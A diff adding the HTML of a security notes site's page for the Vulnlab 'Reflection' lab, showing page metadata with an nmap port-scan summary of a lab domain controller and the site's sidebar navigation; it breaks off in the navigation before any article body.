@@ -1,0 +1,1856 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/lab/vulnlab/reflection/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/lab/vulnlab/reflection/">
+
+
+<title>Reflection  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/lab/vulnlab/reflection/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="Reflection">
+  <meta property="og:description" content="Scan
+PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 13:55:52Z) 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s | smb2-time: | date: 2024-08-27T13:55:56 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not requiredMS01">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Reflection">
+  <meta name="twitter:description" content="Scan
+PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-27 13:55:52Z) 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1s | smb2-time: | date: 2024-08-27T13:55:56 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not requiredMS01">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/lab/",
+       "name": "Labs",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/lab/vulnlab/",
+       "name": "Vulnlab",
+       "position": 4
+     },
+     {
+       "@type": "ListItem",
+       "name": "Reflection",
+       "position": 5
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
